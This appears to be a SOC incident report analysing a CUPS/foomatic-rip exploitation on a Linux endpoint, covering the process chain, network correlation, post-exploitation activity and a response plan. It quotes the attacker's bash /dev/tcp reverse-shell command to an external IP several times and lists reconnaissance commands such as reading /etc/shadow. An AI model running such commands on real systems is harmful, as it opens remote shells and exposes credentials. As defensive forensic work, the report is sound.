Executive Summary

    An investigation was conducted into the suspected exploitation of a vulnerable CUPS printing service on a Linux web server. Analysis of endpoint and CUPS logs confirmed that the attacker achieved command execution through the foomatic-rip print filter and established a reverse shell to 18.217.36.165:9001 under the lp service account.

    Following access, the attacker performed system and account discovery, attempted privilege escalation using sudo su, and attempted to access /etc/shadow. No evidence was identified to confirm successful privilege escalation to root or further malicious activity after the credential-access attempt.

    Overall, the incident resulted in successful remote command execution and limited post-exploitation activity, with no confirmed root-level compromise identified in the available telemetry.

4. Initial Access and Exploitation Analysis

    4.1 CUPS Service Activity

        Analysis of the CUPS logs identified suspicious printer administration activity on 4 October 2024. At 12:11:31 UTC, CUPS recorded a successful CUPS-Add-Modify-Printer request originating from localhost and associated with the root context.

        Approximately one minute later, at 12:12:34 UTC, a print job was submitted to a printer named:

        NEW_COLOR_PRINTER_3000_18_217_36_165

        The printer identifier contains the IP address 18.217.36.165, which was subsequently observed as the destination of the reverse-shell connection. This provides a significant correlation between the CUPS activity and the subsequent malicious network activity.

    4.2 Print Job Processing

        The submitted print job was identified as "Important Sales Analysis Reports" and was stored by CUPS at:

        /var/spool/cups/d00001-001

        The spool file was identified as a PDF version 1.5 document. Examination of the available artifact did not conclusively establish that the PDF itself contained the malicious command. It is therefore treated as an artifact associated with the print job rather than confirmed as the exploit payload.

    4.3 Command Execution Through foomatic-rip

        Endpoint process telemetry subsequently identified foomatic-rip executing under the lp service account. The process spawned a shell that executed the following attacker-controlled command:

        nohup bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"&

        The command established an outbound connection from the affected host to 18.217.36.165:9001, providing the attacker with an interactive reverse shell.

        The observed process chain demonstrates that the attacker successfully abused the CUPS printing workflow to achieve arbitrary command execution through the foomatic-rip filter.

    4.4 Initial Access Assessment

        The available evidence supports the assessment that the CUPS service was successfully exploited to obtain command execution on the affected host. The observed exploitation chain was:

            CUPS exploitation
                ↓
            Printer modification
                ↓
            Print job submission
                ↓
            foomatic-rip
                ↓
            Attacker-controlled shell command
                ↓
            Reverse shell
                ↓
            18.217.36.165:9001

Assessment: Initial access and remote command execution were confirmed. The attacker obtained command execution under the lp service account. However, successful privilege escalation to root was not established from the available telemetry.


Process Execution Analysis:

5. Process Execution Analysis

    5.1 Process Execution Chain

        Endpoint telemetry identified a sequence of processes associated with the exploitation of the CUPS printing service. The activity originated from the CUPS printing process and progressed through foomatic-rip to shell interpreters.

        The observed process chain was:

        /usr/sbin/cupsd
                ↓
        /usr/lib/cups/filter/foomatic-rip
                ↓
        /usr/bin/dash
                ↓
        /usr/bin/bash
                ↓
        Reverse Shell

        foomatic-rip was observed executing under the lp service account, which is consistent with the account used by the CUPS printing subsystem. However, the command executed by the process was inconsistent with normal print-processing activity.


    5.2 foomatic-rip Command Execution

        The following command was observed being executed by foomatic-rip:

        /bin/sh -e -c nohup bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"&

        The command launched a Bash shell and redirected its input and output through a TCP connection to 18.217.36.165:9001.

        This activity is not consistent with the normal operation of a print-processing filter and provides direct evidence that the attacker achieved command execution through the CUPS printing workflow.


    5.3 Shell Execution

        Following execution by foomatic-rip, the endpoint recorded /usr/bin/dash as a child process. The process subsequently executed the Bash reverse-shell command.

        The relevant process relationship was:

        foomatic-rip
            │
            └── dash
                │
                └── bash
                        │
                        └── TCP connection
                            18.217.36.165:9001

        All of the observed processes in this portion of the attack chain were associated with the lp user.


    5.4 Reverse Shell Establishment

        The Bash command established an interactive reverse shell by initiating an outbound connection to:

        Destination IP:   18.217.36.165
        Destination Port: 9001

        The use of:

        bash -i

        provided the attacker with an interactive shell, while:

        /dev/tcp/18.217.36.165/9001

        was used to establish the network connection.

        The successful network connection, combined with the subsequent execution of attacker-issued commands, confirms that the reverse shell was successfully established.


    5.5 Process User Context

        The malicious processes were executed under the lp service account rather than root.

        This is significant because lp is a legitimate account associated with the Linux printing subsystem. The presence of the account itself therefore does not indicate compromise. However, the execution of a reverse shell and subsequent reconnaissance commands under this account indicates that the attacker had successfully abused the privileges of the CUPS printing service.

        No evidence from the observed process telemetry demonstrated that the attacker successfully transitioned from the lp account to root.

        5.6 Process Execution Assessment

        The process telemetry provides direct evidence linking the CUPS exploitation to the subsequent remote access. The execution of an interactive Bash shell by foomatic-rip, followed by an outbound connection to 18.217.36.165:9001, confirms that the attacker progressed from exploitation to remote command execution.


    Assessment: Malicious command execution and establishment of a reverse shell were confirmed. The activity occurred under the lp service account, and successful privilege escalation to root was not established from the available process telemetry.




6. Network Activity Analysis

    6.1 Reverse-Shell : 

       Analysis of the available network telemetry identified an initial outbound connection from the endpoint Bernard to 18.217.36.165 at approximately 12:11:30 UTC. However, no evidence was identified to conclusively associate this connection with the reverse shell.

        Subsequently, the endpoint established two consecutive outbound connections to the same IP address, 18.217.36.165, at approximately 12:12:34 UTC and 12:12:39 UTC. Endpoint process telemetry confirmed that these connections were associated with execution of the following Bash command:

        bash -c "bash -i >& /dev/tcp/18.217.36.165/9001 0>&1"

        The command uses Bash's /dev/tcp functionality to establish a TCP connection to 18.217.36.165 on port 9001 and redirect the shell's input and output through the connection. The correlation between the process execution and the network connections confirms the establishment of a reverse shell between the affected endpoint and the attacker-controlled IP address.


    6.2 Source and Destination Analysis
        Internal Source Endpoint

            The source IP address 172.16.17.178 was identified as belonging to the internal endpoint Bernard, which was the affected host in the incident. Network telemetry showed outbound connections from this endpoint to 18.217.36.165 during the period of the suspected compromise.

        External Destination IP Analysis

            The external IP address 18.217.36.165 was investigated using available threat-intelligence and IP reputation sources.

        WHOIS Analysis:
            The IP address is registered to Amazon Technologies Inc. (AT-88-Z) and is associated with Amazon's infrastructure. The available registration information identifies the organization as Amazon Technologies Inc., with an address in Seattle, Washington.

        AbuseIPDB:
            No reported malicious activity was identified for the IP address at the time of investigation.

        VirusTotal:
            The IP address received a 0/91 detection score, indicating that none of the queried security vendors had identified the IP as malicious at the time of analysis.

        IPVoid:
            The IP address received a 1/99 detection score, indicating that one of the queried security sources had associated the address with potentially suspicious activity. Reverse DNS information resolved the address to:

            ec2-18-217-36-165.us-east-2.compute.amazonaws.com

            This hostname indicates that the address is associated with Amazon EC2 infrastructure in the US East (Ohio) region.

    Assessment

        The available threat-intelligence sources did not establish 18.217.36.165 as a previously known malicious IP address. However, IP reputation alone does not determine whether an address was maliciously used during an incident. In this case, endpoint telemetry directly associated the IP address with the execution of a reverse-shell command and subsequent outbound connections from the compromised endpoint.

        Therefore, 18.217.36.165 is assessed as a malicious destination within the context of this incident, despite having little or no prior reputation for malicious activity.

        No additional network events were available to establish whether the source maintained communication with the destination following the detected request.
    

    6.3 Network and endpoint Correlation 

        Network and endpoint logs where correlated in order to validate the outbound conecrions and the reverse shell activity. At  12:12:34 and  12:12:39 respectively the endpoint established an outbound connection to the malicious ip "18.217.36.165" and the process logs registered 2 malicious bash scripts "nohup bash -c bash -i >& /dev/tcp/18.217.36.165/9001 0>&1" being excuted at 12:12:39  to the same destination ip.

        The matching destination IP, temporal proximity, and presence of the destination address and port within the executed command provide sufficient correlation to attribute the observed network connections to the reverse-shell activity. This establishes a direct relationship between the endpoint process execution and the external network connection.

7. Post Exploitation Analysis: 

  Following establishment of the reverse shell, the attacker executed several commands under the lp service account to assess the compromised system and attempt privilege escalation.

    The observed commands included:

    whoami /priv
    ls
    sudo su
    cat /etc/passwd
    cat /etc/shadow

    The commands indicate privilege discovery, system reconnaissance, account discovery, and attempts to obtain elevated privileges and access credential information.

    The execution of sudo su indicates an attempt to obtain a root shell. However, available telemetry continued to associate the activity with the lp account, and no evidence confirmed successful privilege escalation.

    Similarly, execution of cat /etc/shadow indicates an attempt to access protected credential information; however, successful extraction of password hashes could not be confirmed.

    Assessment: The attacker performed limited post-exploitation reconnaissance and attempted privilege escalation and credential access. Successful root access or credential extraction was not established.    

Persistence and Futher Compromise Analysis: 

  Based on the available endpoint telemetry, no new user accounts, automated scripts, SSH keys, or other persistence mechanisms were identified. No evidence was observed indicating that the attacker established persistence on the affected endpoint.

Assesment: Persistence was not indentified based on the available evidence.

10. Incident Assessment and Impact

Based on the available evidence and the observed attack chain, the incident is assessed as High due to the successful exploitation of the CUPS service, execution of attacker-controlled commands, and establishment of a reverse shell to an external host.

The attacker obtained interactive access to the endpoint under the lp service account and subsequently performed system and account discovery, attempted privilege escalation, and attempted to access protected credential information. Although no successful privilege escalation to root, persistence, or confirmed data exfiltration was identified, the established remote access created a significant risk of further compromise and potential data loss.

The confirmed activity demonstrates that the vulnerability provided the attacker with unauthorized remote command execution on the affected endpoint. While the available evidence indicates that the observed post-exploitation activity was limited, the attacker's ability to execute commands remotely meant that further compromise could have occurred had the access remained available.

Response: 

    Containment

    Immediately isolate the endpoint BERNARD from the organization's network to prevent further unauthorized access and potential lateral movement. Block the identified malicious destination 18.217.36.165 at the appropriate network security controls and monitor for additional connections to the address from other endpoints.

    Eradication

    Conduct a forensic examination of BERNARD to identify and remove any remaining malicious processes, files, unauthorized configurations, or other artifacts associated with the compromise. Review the system for potential persistence mechanisms and investigate for evidence of further compromise or data exfiltration.

    The exploited CUPS vulnerability should be remediated, including updating the affected CUPS components to a secure version and disabling unnecessary CUPS functionality where operationally appropriate.

    Recovery

    After remediation, validate that the endpoint is free from malicious processes, unauthorized accounts, persistence mechanisms, and other indicators of compromise before returning it to normal operation. Restore the endpoint to the organization's network under increased monitoring and verify that the CUPS vulnerability has been addressed across other systems running the affected service.


Lessons / Preventive Actions
Ensure CUPS and other internet-facing services are regularly patched.
Restrict access to administrative interfaces and unnecessary network services.
Monitor for unusual child processes spawned by system services such as cupsd and foomatic-rip.
Alert on outbound connections from service accounts to unusual external destinations.
Review other endpoints running CUPS for similar indicators of compromis
